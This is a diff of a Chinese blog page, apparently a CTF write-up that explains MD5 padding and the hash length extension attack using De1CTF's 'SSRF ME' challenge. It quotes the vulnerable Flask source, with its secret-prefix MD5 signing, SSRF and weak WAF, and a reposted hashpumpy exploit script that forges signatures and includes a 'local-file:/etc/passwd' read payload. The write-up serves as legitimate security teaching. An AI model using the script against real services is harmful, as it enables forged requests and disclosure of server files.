@@ -28,7 +28,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/polgry.github.io/css/style.css?v=1568112015913">
+  <link rel="stylesheet" href="/polgry.github.io/css/style.css?v=1568112658426">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -144,13 +144,122 @@
 <h3 id="0X1摘要算法实现过程"><a href="#0X1摘要算法实现过程" class="headerlink" title="0X1摘要算法实现过程"></a><strong>0X1</strong>摘要算法实现过程</h3><p>以MD5为例，理解一下，Hash算法过程</p>
 <p>以这个流程图为例MD5计算过程分为以下几步：<br>•    第一步把消息进行分组，每组64 byte（512bit），<br>•    第二步不足64byte 的部分会用padding补位，补位是使每一个分组均为512位<br>•    第三步每一个分组最后的8byte表示的是补充前的消息长度，在补位之后，小段存储，高放高，低放低。如果有一种情况,消息长度是大于64 位的 则取低64bit<br>示意图见右上角部分</p>
 <p>这是每一个分组的构成<br>ps:这里单独讲一下第二步补位的部分，<br>消息补位是使得其长度在对 512 取模后的值为 448（512-8*8）。也就是说，len(message) mod(512) == 448。补位二进制表示是在消息的后面加上一个1，后面跟着 n 个0，直到 len(message) mod (512) == 448。在 16 进制下，我们需要在消息后补80，就是 2 进制的10000000。我们把消息进行补位到 448 bit，也就是 56 byte。<br>•    第四步计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit 的消息（即64 byte ）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure>
-
-<p>经过一次消息再要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。     一轮一轮，上一个分组的结果进入下一轮运算。<br>这样已知一个哈希值hash(key|s|padding)，  可以构造出其他的hash(key|s|padding|else)<br>用hash(key|s|padding) 作为矢量，进入下一个分组，计算下一个hash<br>位数问题，爆破….</p>
+<pre><code>A=0x67452301
+B=0xefcdab89
+C=0x98badcfe
+D=0x10325476</code></pre><p>经过一次消息再要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。     一轮一轮，上一个分组的结果进入下一轮运算。<br>这样已知一个哈希值hash(key|s|padding)，  可以构造出其他的hash(key|s|padding|else)<br>用hash(key|s|padding) 作为矢量，进入下一个分组，计算下一个hash<br>位数问题，爆破….</p>
 <h3 id="0X哈希长度拓展攻击-Hash-Length-Extension-Attacks-的实现"><a href="#0X哈希长度拓展攻击-Hash-Length-Extension-Attacks-的实现" class="headerlink" title="0X哈希长度拓展攻击(Hash Length Extension Attacks)的实现"></a>0X哈希长度拓展攻击(Hash Length Extension Attacks)的实现</h3><p>下面用De1CTF 的SSRF ME 来讲解一下<br>审计源码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">#encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;latin1&apos;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line"></span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line">            </span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&apos;data&apos;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">                result[&apos;data&apos;] = f.read()</span><br><span class="line">            if result[&apos;code&apos;] == 500:</span><br><span class="line">                result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&apos;code&apos;] = 500</span><br><span class="line">            result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line">    </span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;,port=80)</span><br></pre></td></tr></table></figure>
+<pre><code>#! /usr/bin/env python
+#encoding=utf-8
+from flask import Flask
+from flask import request
+import socket
+import hashlib
+import urllib
+import sys
+import os
+import json
+reload(sys)
+sys.setdefaultencoding(&#39;latin1&#39;)
 
-<p>可以看到三个路由</p>
+app = Flask(__name__)
+
+secert_key = os.urandom(16)
+
+
+class Task:
+
+    def __init__(self, action, param, sign, ip):
+        self.action = action
+        self.param = param
+        self.sign = sign
+        self.sandbox = md5(ip)
+        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
+            os.mkdir(self.sandbox)
+
+    def Exec(self):
+        result = {}
+        result[&#39;code&#39;] = 500
+        if (self.checkSign()):
+            if &quot;scan&quot; in self.action:
+                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
+                resp = scan(self.param)
+                if (resp == &quot;Connection Timeout&quot;):
+                    result[&#39;data&#39;] = resp
+                else:
+                    print resp
+                    tmpfile.write(resp)
+                    tmpfile.close()
+                result[&#39;code&#39;] = 200
+            if &quot;read&quot; in self.action:
+                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
+                result[&#39;code&#39;] = 200
+                result[&#39;data&#39;] = f.read()
+            if result[&#39;code&#39;] == 500:
+                result[&#39;data&#39;] = &quot;Action Error&quot;
+        else:
+            result[&#39;code&#39;] = 500
+            result[&#39;msg&#39;] = &quot;Sign Error&quot;
+        return result
+
+    def checkSign(self):
+        if (getSign(self.action, self.param) == self.sign):
+            return True
+        else:
+            return False
+
+
+#generate Sign For Action Scan.
+@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def geneSign():
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    action = &quot;scan&quot;
+    return getSign(action, param)
+
+
+@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])
+def challenge():
+    action = urllib.unquote(request.cookies.get(&quot;action&quot;))
+    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))
+    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))
+    ip = request.remote_addr
+    if(waf(param)):
+        return &quot;No Hacker!!!!&quot;
+    task = Task(action, param, sign, ip)
+    return json.dumps(task.Exec())
+@app.route(&#39;/&#39;)
+def index():
+    return open(&quot;code.txt&quot;,&quot;r&quot;).read()
+
+
+def scan(param):
+    socket.setdefaulttimeout(1)
+    try:
+        return urllib.urlopen(param).read()[:50]
+    except:
+        return &quot;Connection Timeout&quot;
+
+
+
+def getSign(action, param):
+    return hashlib.md5(secert_key + param + action).hexdigest()
+
+
+def md5(content):
+    return hashlib.md5(content).hexdigest()
+
+
+def waf(param):
+    check=param.strip().lower()
+    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):
+        return True
+    else:
+        return False
+
+
+if __name__ == &#39;__main__&#39;:
+    app.debug = False
+    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><p>可以看到三个路由</p>
 <p>/:  首页 获取源码<br>/geneSign：获取param参数，结合预设的action scan来调用getSign 生成签名，<br>/Delta： 从cookie 里获取action 和sign，再获取param参数，结合ip构造一个Task类对象，再以json返回其Exec方法执行的结果</p>
 <p>看到 Task 类的 Exec 方法<br>先看 action 里有没有 scan，有的话就调用 scan 方法来读取内容并写到沙盒下的 result.txt 文件。</p>
 <ul>
@@ -159,9 +268,22 @@
 </ul>
 <p>这里算 md5 时 param，action 可控，并且 action 在最后，这样我们就可以利用哈希长度扩展攻击，在 action 后面拼接上我们想要的东西，并且预测出拼接之后的 md5。这里我们就可以在 scan 后面拼上 read 了。</p>
 <p>贴个网上的wp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import hashpumpy</span><br><span class="line">import requests</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">url = &apos;flag.txt&apos;</span><br><span class="line"># url = &apos;local-file:/etc/passwd&apos;</span><br><span class="line">r = requests.get(&apos;http://web68.buuoj.cn/geneSign&apos;, params=&#123;&apos;param&apos;: url&#125;)</span><br><span class="line">sign = r.text</span><br><span class="line">hash_sign = hashpumpy.hashpump(sign, url + &apos;scan&apos;, &apos;read&apos;, 16)</span><br><span class="line"></span><br><span class="line">r = requests.get(&apos;http://web68.buuoj.cn/De1ta&apos;, params=&#123;&apos;param&apos;: url&#125;, cookies=&#123;</span><br><span class="line">    &apos;sign&apos;: hash_sign[0],</span><br><span class="line">    &apos;action&apos;: urllib.parse.quote(hash_sign[1][len(url):])</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<pre><code>import hashpumpy
+import requests
+import urllib.parse
 
+url = &#39;flag.txt&#39;
+# url = &#39;local-file:/etc/passwd&#39;
+r = requests.get(&#39;http://web68.buuoj.cn/geneSign&#39;, params={&#39;param&#39;: url})
+sign = r.text
+hash_sign = hashpumpy.hashpump(sign, url + &#39;scan&#39;, &#39;read&#39;, 16)
 
+r = requests.get(&#39;http://web68.buuoj.cn/De1ta&#39;, params={&#39;param&#39;: url}, cookies={
+    &#39;sign&#39;: hash_sign[0],
+    &#39;action&#39;: urllib.parse.quote(hash_sign[1][len(url):])
+})
+
+print(r.text)</code></pre>
             
         </article>
     </div>
@@ -207,7 +329,7 @@
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/polgry.github.io/js/app.js?v=1568112015918"></script>
+<script src="/polgry.github.io/js/app.js?v=1568112658435"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
